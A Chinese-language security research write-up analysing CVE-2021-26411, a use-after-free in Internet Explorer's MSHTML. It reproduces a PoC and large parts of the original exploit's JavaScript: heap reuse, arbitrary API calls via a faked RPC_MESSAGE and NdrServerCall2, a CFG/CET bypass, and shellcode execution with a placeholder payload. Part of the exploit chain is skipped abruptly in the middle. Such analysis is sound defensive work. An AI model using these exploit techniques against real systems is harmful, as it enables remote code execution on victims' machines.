除了上述攻击手法外，攻击者当时还使用了一个IE 0day漏洞，这个漏洞后来被披露为CVE-2021-26411。CVE-2021-26411的原始攻击代码具有较高的研究意义，因为它(在原理上)绕过了最新的CFG和CET缓解措施。CFG的全称为Control Flow Guard,是Windows 8.1及以上系统实现的一种控制流防护技术， CET的全称为Control-flow Enforcement Technology，是Intel新款芯片配合Windows  10 2004及以上操作系统实现的一种控制流增强技术，其可以有效防御通过覆盖栈上返回地址绕过CFG的手法。

  

本文总结了猎影实验室对CVE-2021-26411这个IE漏洞的研究成果。

  

**漏洞成因分析**

  

CVE-2021-26411是MSHTML.dll模块内的一个UAF漏洞，该漏洞影响IE9~IE11。

漏洞的Poc如下：

var elem = document.createElement('elem');

var attr = document.createAttribute('attr');

 

var obj = {};

obj.valueOf = function() {

    elem.clearAttributes();

    CollectGarbage();

    return 0;

};

 

attr.nodeValue = obj;

elem.setAttributeNode(attr);

elem.setAttribute('xxx', Array(0x20000).join('x'));

elem.removeAttributeNode(attr); // callback here

漏洞的成因可以概括如下：

removeAttributeNode函数在访问Element的Attribute时，如果当前Attribute的nodeValue是一个对象，则在访问的过程中会调用对象绑定的valueOf回调函数，以便将对象转化为预期的原始值。而在valueOf内可以通过调用clearAttributes与CollectGarbage将Element的Attribute(例如为一个BSTR对象)释放。回调结束后，removeAttributeNode会再次尝试释放Element的Attribute成员，导致UAF(也可以归类为Double Free)。

  

本小节分析所用到的漏洞模块版本如下：

IE11 MSHTML.dll 11.00.9600.17842

  

触发细节：

IE中调用removeAttributeNode函数时，底层会调用CElement::ie9\_removeAttributeNodeInternal函数，CElement::ie9\_removeAttributeNodeInternal函数内部会先后调用MSHTML!CBase::GetIntoBSTRAt和CAttrArray::Destroy。在MSHTML!CBase::GetIntoBSTRAt内会触发valueOf回调，提前释放了CattrArray数组，等后面CAttrArray::Destroy再次释放CattrArray数组时，就会造成UAF。

**漏洞利用分析**

  

韩国网络安全公司ENKI在该漏洞被修复后披露了原始攻击的利用代码，相关代码可以在下文中找到，本小节部分主要参考这份代码。

https://enki.co.kr/blog/2021/02/04/ie\_0day.html

从UAF到任意地址读写

Use->Free->Reuse->Free->Reuse

这个漏洞在利用时首先要避免空指针引用情况的发生，即避免index=-1的情况发生，关于这部分的细节，研究员@iamelli0t已经在他的博客中写明，详情可以参考下面这篇文章：

https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html#from-null-pointer-dereference-to-readwrite-primitive

为了防止空指针引用，利用代码采用如下方式：

att.nodeValue = {

    valueOf: function() { 

        hd1.nodeValue = (new alloc1).nodeValue;

        ele.clearAttributes();

        hd2 = hd1.cloneNode();

        ele.setAttribute("attribute", 1337); // 重新设置一个attribute可避免空指针引用情况的发生

    }

};

 

ele.setAttributeNode(att);

ele.setAttribute("attr", "0".repeat(0x10005));

ele.removeAttributeNode(att);

 

hd0.nodeValue = alloc;

这个漏洞的成因是valueOf制造了双重释放场景，从而导致了UAF，因此利用代码在利用这个漏洞时，采用了Use->Free->Reuse->Free->Reuse的方式。

**/****/****Use**

利用代码先借助BSTR为“attr”属性申请一片大小为0x2000A(2\*0x10005)的内存。

**/****/****Free**

第一次Free，valueOf中调用ele.clearAttributes导致“attr”属性对应的Node被删除，内存大小为0x2000A的BSTR字符串内存被释放，BSTR申请的内存位于Isolated Heap以外，不存在延迟释放问题。

**/****/****Reuse**

为了重新使用被释放的内存，利用代码在valueOf回调内借助hd2 = hd1.cloneNode()调用了alloc1函数，alloc1函数实现如下：

function pad0(str) {

    return("0000" + str).slice(-4);

}

 

function alloc1() {

    var view = new DataView(abf);

    str = ""

    for(i = 4; i < abf.byteLength - 2; i += 2) {

        str += "%u" + pad0(view.getUint16(i, true).toString(16));

    }

    var result = document.createAttribute("alloc");

    result.nodeValue = unescape(str);

    return result;

}

而abf的定义如下：

abf = new ArrayBuffer(0x20010);

这里采用的思路是用一段大小为0x20010大小(略微大于0x2000A)的字符串去重用被释放的内存，并用hd2进行引用。

**/****/****Free**

valueOf回调结束后，ele.removeAttributeNode(att)再次释放同一块内存。

**/****/****Reuse**

随后，利用代码借助alloc(即alloc2)函数再次重用被释放的内存，alloc2的函数实现如下：

function alloc2() {

    var dic1 = new ActiveXObject("Scripting.Dictionary");

    var dic2 = new ActiveXObject("Scripting.Dictionary");

 

    dic2.add(0, 1);

    dic1.add(0, dic2.items());

    dic1.add(1, fake);

    dic1.add(2, arr);

 

    for(i = 3; 0x2001 > i; ++i) {

        dic1.add(i, 0x12341234);

    }

 

    return dic1.items();

**调用NdrServerCall2**

封装完上述结构后，利用代码得到了一个伪造的RPC\_MESSAGE并保存在msg中，并将“xyz”这个CAttribute对象虚表中的normalize函数指针替换为了rpcrt4!NdrServerCall2。此后，只要在JavaScript层面调用xyz.normalize，就可以调用NdrServerCall2函数。

由于NdrServerCall2最终调用的是RPC\_DISPATCH\_TABLE.RPC\_DISPATCH\_FUNCTION内的函数指针，且相关的函数参数存储在RPC\_MESSAGE.Buffer中，只要把想调用的函数地址和函数参数写入RPC\_DISPATCH\_TABLE.RPC\_DISPATCH\_FUNCTION和RPC\_MESSAGE.Buffer，就可以在JavaScript层面调用任意Windows API函数。

  

**借助JavaScript调用任意Windows API**

利用代码借助上述方法封装了若干函数，如下面的代码所示。只要调用call2并将Windows API的函数名和参数传入，就可以实现调用系统函数。

function readyRpcCall(func) {

    var PRPC\_CLIENT\_INTERFACE\_Buffer = \_RPC\_MESSAGE.get(msg, "RpcInterfaceInformation");

    \_MIDL\_SERVER\_INFO\_Buffer = PRPC\_CLIENT\_INTERFACE.get(PRPC\_CLIENT\_INTERFACE\_Buffer, "InterpreterInfo");

    RPC\_DISPATCH\_TABLE\_Buffer = \_MIDL\_SERVER\_INFO\_.get(\_MIDL\_SERVER\_INFO\_Buffer, "DispatchTable");

    write(RPC\_DISPATCH\_TABLE\_Buffer, func, 32);

}

 

function setArgs(args) {

    var buffer = createArrayBuffer(0x30);

 

    for(i = 0; i < args.length; ++i) {

        write(buffer + 4 \* i, args\[i\], 32);

    }

 

    \_RPC\_MESSAGE.set(msg, "Buffer", buffer);

    \_RPC\_MESSAGE.set(msg, "BufferLength", 0x30);

    \_RPC\_MESSAGE.set(msg, "RpcFlags", 0x1000);

    return buffer;

}

 

function call(addr) {

    var result = 0;

    write(paoi + 0x18, addr, 32);

 

    try {

        xyz.normalize();

    }catch(error) {

        result = error.number; // return value

    }

 

    write(paoi + 0x18, patt, 32);

    return result;

}

 

function call2(func, args) {

    readyRpcCall(func);

    var buffer = setArgs(args);

    call(msg);

    map\["delete"\](buffer);

    return callRpcFreeBuffer();

}

  

**获取OSF\_SCALL::vftable指针**

上面已经提到，伪造RPC\_MESSAGE.Handle时需要获取一个正确的虚表指针，而这个虚表指针可以从I\_RpcTransServerNewConnection函数的返回值中获取，相关原理这里进行说明。

I\_RpcTransServerNewConnection函数内会调用OSF\_SCONNECTION::OSF\_SCONNECTION并保存到返回值，

![](../Images/8299c89a4c69d5d11b6de2f50952fe7f.png)

而OSF\_SCONNECTION::OSF\_SCONNECTION内部会调用OSF\_SCALL::OSF\_SCALL构造函数申请OSF\_SCALL对象，返回的结果中就保存着OSF\_SCALL::vftable这个虚表指针，所以OSF\_SCALL::vftable可以通过I\_RpcTransServerNewConnection函数的返回值查找得到。

![](../Images/5d34b22021a2c6fafee3de1b90ed301c.png)

利用代码为了调用I\_RpcTransServerNewConnection函数，单独封装了一个aos函数：

function aos() {

    var baseObj = createBase();

    addr = baseObj.addr + baseObj.size;

    I\_RpcTransServerNewConnection = getProcAddr(rpcrt4, "I\_RpcTransServerNewConnection");

    prepareCall(addr, I\_RpcTransServerNewConnection);

    return read(read(call(addr) - 0xf8, 32), 32);

}

上述获取OSF\_SCALL::vftable值的方式并不是唯一的，暴力查找也可以获取该值，2016年公开的该方法的原始代码就是采用的暴力查找，但上述方式的适配性显然更好。

  

**绕过CFG**

在上述步骤都操作得当之后，为了让利用代码在Windows 8.1及以上系统得到执行，还需要绕过 CFG。绕过CFG目前已经有一些公开的方式，比如覆盖栈返回地址绕过CFG。但从Windows 10 2004开始，在新款Intel芯片的支持下，Windows 10系统引入了期待已久的CET机制，理论上，在开启CET的系统中，通过覆盖栈返回地址绕过CFG的方式已经不再可行。虽然CET机制在目前最新的Windows 10 20H2操作系统上还没有覆盖到32位IE进程，但利用代码采用的方法在原理上绕过了CFG+CET缓解机制。利用代码借助JavaScript代码将rpcrt4模块的\_\_\_guard\_check\_icall\_fptr指针替换为KiFastSystemCallRet函数地址，从而绕过了rpcrt4! NdrServerCall2函数前的CFG检测，从而可以直接调用call2函数执行shellcode，相关代码如下所示：

function CFGObject(baseAddress) {

    var PEAddr = isPE(baseAddress);

    eat = PEAddr + 0x78;

    LOAD\_CONFIG\_DIRECTORY = baseAddress + read(eat + 0x50, 32);

    size = read(LOAD\_CONFIG\_DIRECTORY, 32);

    sizeOfImage = read(PEAddr + 0x50, 32);

 

    CFGSymbolTable = new SymTab(

        0x5c, 

        {

            \_\_\_guard\_check\_icall\_fptr: {offset: 0x48, size: 0x20}

        }

    );

 

    guard\_check\_icall\_fptr\_address = size < CFGSymbolTable.size() ? 0 : CFGSymbolTable.get(LOAD\_CONFIG\_DIRECTORY, "\_\_\_guard\_check\_icall\_fptr");

 

    this.getCFGAddress =  function() {

        return guard\_check\_icall\_fptr\_address;

    };

 

    this.getCFGValue = function() {

        if(size < CFGSymbolTable.size())

            return false;

        var currentCFGValue = read(guard\_check\_icall\_fptr\_address, 32);

        isValidAddress = currentCFGValue > baseAddress && baseAddress + sizeOfImage > currentCFGValue;

        return !isValidAddress;

    };

}

 

function killCfg(addr) {

    var cfgobj = new CFGObject(addr);

    if(cfgobj.getCFGValue()) {

        var guard\_check\_icall\_fptr\_address = cfgobj.getCFGAddress();

        KiFastSystemCallRet = getProcAddr(ntdll, "KiFastSystemCallRet");

        tmpBuffer = createArrayBuffer(4);

        call2(VirtualProtect, \[guard\_check\_icall\_fptr\_address, 0x1000, 0x40, tmpBuffer\]);

        write(guard\_check\_icall\_fptr\_address, KiFastSystemCallRet, 32);

        call2(VirtualProtect, \[guard\_check\_icall\_fptr\_address, 0x1000, read(tmpBuffer, 32), tmpBuffer\]);

        map\["delete"\](tmpBuffer);

    }

}

 

killCfg(rpcrt4);

**执行Shellcode**

绕过CFG和CET后，利用代码调用LoadLibraryExA函数加载了msi.dll模块，并将shellcode写入基地址+0x5000的地方，随后调用call2函数执行shellcode：

var shellcode = new Uint8Array(\[0xCC, 0xCC\]);  
msi = call2(LoadLibraryExA, \[newStr("msi.dll"), 0, 1\]) + 0x5000;  
tmpBuffer = createArrayBuffer(4);  
call2(VirtualProtect, \[msi, shellcode.length, 4, tmpBuffer\]); // PAGE\_READWRITE  
writeData(msi, shellcode);  
call2(VirtualProtect, \[msi, shellcode.length, read(tmpBuffer, 32), tmpBuffer\]);  
var result = call2(msi, \[\]);

这里加载msi.dll并不是必须的，也可以将shellcode存放在一个ArrayBuffer的buffer内，然后调用VirtualProtect将buffer所在内存处设为可执行，最后调用call2一样可以实现代码执行，利用代码作者这样写可能是为了避免某些安全软件的检测。

需要指出的是，这种IE漏洞在IE11环境中需要配合一个提权漏洞才能实现代码执行，目前还未见到对这个漏洞配套使用的提权漏洞的披露，值得继续追踪。
